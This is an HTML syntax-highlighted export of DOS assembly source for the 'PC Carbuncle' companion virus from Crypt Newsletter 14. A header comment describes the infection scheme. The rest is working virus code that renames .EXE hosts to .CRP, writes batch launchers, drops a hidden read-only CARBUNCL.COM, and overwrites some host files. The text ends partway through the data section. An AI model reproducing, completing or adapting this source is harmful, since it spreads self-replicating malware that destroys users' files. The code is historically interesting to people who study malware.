<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;The PC CARBUNCLE VIRUS - a companion virus for Crypt Newsletter 14                </span><span class="sc0">
</span><span class="sc1">;The PC Carbuncle is a "toy" virus which will search out every .EXEfile</span><span class="sc0">
</span><span class="sc1">;in the current directory, rename it with a .CRP [for Crypt] extent and</span><span class="sc0">
</span><span class="sc1">;create a batchfile.  The batchfile calls the PC Carbuncle [which has</span><span class="sc0">
</span><span class="sc1">;copied itself to a hidden file in the directory], renames the host</span><span class="sc0">
</span><span class="sc1">;file to its NORMAL extent, executes it, hides it as a .CRP file once</span><span class="sc0">
</span><span class="sc1">;again and issues a few error messages.  The host files function</span><span class="sc0">
</span><span class="sc1">;normally. Occasionaly, the PC Carbuncle will copy itself to a few</span><span class="sc0">
</span><span class="sc1">;of the host .CRP files, destroying them.  The majority of the host</span><span class="sc0">
</span><span class="sc1">;files in the PC Carbuncle-controlled directory will continue to function,</span><span class="sc0">
</span><span class="sc1">;in any case.  If the user discovers the .CRP and .BAT files and is smart</span><span class="sc0">
</span><span class="sc1">;enough to delete the batchfiles and rename the .CRP hosts to their</span><span class="sc0">
</span><span class="sc1">;normal .EXE extents, the .CRPfiles which have been infected by the</span><span class="sc0">
</span><span class="sc1">;virus will re-establish the infection in the directory.</span><span class="sc0">
</span><span class="sc1">;--Urnst Kouch, Crypt Newsletter 14</span><span class="sc0">
        
        </span><span class="sc9">.radix</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
     </span><span class="sc5">code</span><span class="sc0">       </span><span class="sc9">segment</span><span class="sc0">
        </span><span class="sc5">model</span><span class="sc0">  </span><span class="sc10">small</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">begin</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">vir_start</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'·ù.ö‚NstÜdâMñ$'</span><span class="sc0">      </span><span class="sc1">; name</span><span class="sc0">
          
</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">              </span><span class="sc1">; exit to DOS</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">vir_start</span><span class="sc4">:</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ch</span><span class="sc0">               </span><span class="sc1">; DOS get system time.                      </span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                  </span><span class="sc1">; &lt;--alter values to suit        </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">                </span><span class="sc1">; is seconds &gt; 10?</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">      </span><span class="sc5">batch_stage</span><span class="sc0">          </span><span class="sc1">; if so, be quiet  (jg)</span><span class="sc0">
              </span><span class="sc1">; with the virus counter, this feature arrests the  </span><span class="sc0">
                         </span><span class="sc1">; overwriting infection so </span><span class="sc0">
                         </span><span class="sc1">; computing isn't </span><span class="sc0">
                         </span><span class="sc1">; horribly disrupted</span><span class="sc0">
                         </span><span class="sc1">; when the virus is about</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                 </span><span class="sc1">; infect only a few files</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">count</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">             </span><span class="sc1">; by establishing a counter</span><span class="sc0">


</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">                </span><span class="sc1">; &lt;----find first file of</span><span class="sc0">
</span><span class="sc5">recurse</span><span class="sc4">:</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crp_ext</span><span class="sc0">     </span><span class="sc1">; matching filemask, "*.crp"</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                   </span><span class="sc1">; because PC CARBUNCLE has  </span><span class="sc0">
                          </span><span class="sc1">; in most cases, already created</span><span class="sc0">
                          </span><span class="sc1">; them.</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">batch_stage</span><span class="sc0">           </span><span class="sc1">; jump on carry to</span><span class="sc0">
                          </span><span class="sc1">; spawn if no .CRPfiles found</span><span class="sc0">
        
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D01h</span><span class="sc0">              </span><span class="sc1">; open .CRPfile r/w  </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">009Eh</span><span class="sc0">                
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     
    
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">               </span><span class="sc1">; starting from beginning</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; put handle in ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc0">                 </span><span class="sc1">; to write: PC CARBUNCLE </span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">; write the virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                 </span><span class="sc1">; close the file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     
        
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc5">count</span><span class="sc0">                  </span><span class="sc1">; take one off the count</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">                   </span><span class="sc1">; and exit when a few files</span><span class="sc0">
                           </span><span class="sc1">; are overwritten with virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">                 </span><span class="sc1">; find next file</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">Short</span><span class="sc0"> </span><span class="sc5">recurse</span><span class="sc0">          </span><span class="sc1">; and continue until all .CRP</span><span class="sc0">
                           </span><span class="sc1">; files converted to PC</span><span class="sc0">
                           </span><span class="sc1">; CARBUNCLE's</span><span class="sc0">
 
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">batch_stage</span><span class="sc4">:</span><span class="sc0">    
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_create</span><span class="sc0">  </span><span class="sc1">; create file, name of</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; CARBUNCL.COM</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">
                        </span><span class="sc1">; Write virus body to file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">

                        </span><span class="sc1">; Close file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                    </span><span class="sc1">; ASSUMES bx still has file handle</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">

                        </span><span class="sc1">; Change attributes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_create</span><span class="sc0">     </span><span class="sc1">; of created file to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                      </span><span class="sc1">;(1) read only and (2) hidden</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">



                         </span><span class="sc1">; get DTA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">                  </span><span class="sc1">; where to put dta</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LAST</span><span class="sc4">+</span><span class="sc2">90H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc0">                  </span><span class="sc1">; find first .EXE file</span><span class="sc0">
</span><span class="sc5">small_loop</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; to CARBUNCL-ize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vict_ext</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; searchmask, *.exe</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">30d</span><span class="sc0">  </span><span class="sc1">; save name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12d</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_name</span><span class="sc0">        </span><span class="sc1">; put name in bat buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bat_name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12d</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bat_name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9d</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'SU'</span><span class="sc0">    </span><span class="sc1">; useless rubbish </span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cont</span><span class="sc0">                
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4fh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">small_loop</span><span class="sc0">
        
</span><span class="sc5">cont</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bat_ext</span><span class="sc0">         </span><span class="sc1">;fix bat</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">blank</span><span class="sc0">           </span><span class="sc1">;further fix bat</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_name</span><span class="sc0">       </span><span class="sc1">; fill rename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rename_name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12d</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rename_name</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">moc_ext</span><span class="sc0">          </span><span class="sc1">; fix rename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">blank</span><span class="sc0">            </span><span class="sc1">; further fix rename</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">; copy the string over</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_name</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">blank</span><span class="sc0">           </span><span class="sc1">; put a few blanks</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
      
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_name</span><span class="sc0">      </span><span class="sc1">;fill in the created batfile</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com1</span><span class="sc0">           
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12d</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_name</span><span class="sc0">      </span><span class="sc1">; more fill</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12d</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_name</span><span class="sc0">       </span><span class="sc1">; copy more fill</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12d</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">blank</span><span class="sc0">
</span><span class="sc5">point_srch</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                         </span><span class="sc1">; get rid of an annoying</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">          </span><span class="sc1">; period </span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">point_srch</span><span class="sc0">                 
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rename_name</span><span class="sc0">      </span><span class="sc1">; copy more fill</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">moc1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12d</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rename_name</span><span class="sc0">      </span><span class="sc1">; copy still more fill</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">moc2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12d</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_name</span><span class="sc0">        </span><span class="sc1">; rename original file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rename_name</span><span class="sc0">      </span><span class="sc1">; to new .CRP name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">56h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bat_name</span><span class="sc0">         </span><span class="sc1">; create batfile</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l_bat</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">s_bat</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; length of batfile</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">s_bat</span><span class="sc0">             </span><span class="sc1">; write to file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3eh</span><span class="sc0">                      </span><span class="sc1">; close batfile</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">next_vict</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4fh</span><span class="sc0">                      </span><span class="sc1">; find the next host</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">small_loop</span><span class="sc0">                   </span><span class="sc1">; and create more</span><span class="sc0">
                             </span><span class="sc1">; "controlled" .CRPs</span><span class="sc0">
</span><span class="sc5">count</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">           </span><span class="sc1">;&lt;---count buffer, bogus value </span><span class="sc0">
</span><span class="sc5">crp_ext</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"*.crp"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;&lt;---- searchmask for PC CARBUNCLE</span><span class="sc0">
</span><span class="sc5">file_create</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CARBUNCL.COM"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;&lt;---CARBUNCL shadow virus</span><span class="sc0">
</span><span class="sc5">bat_ext</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"BAT"</span><span class="sc0">
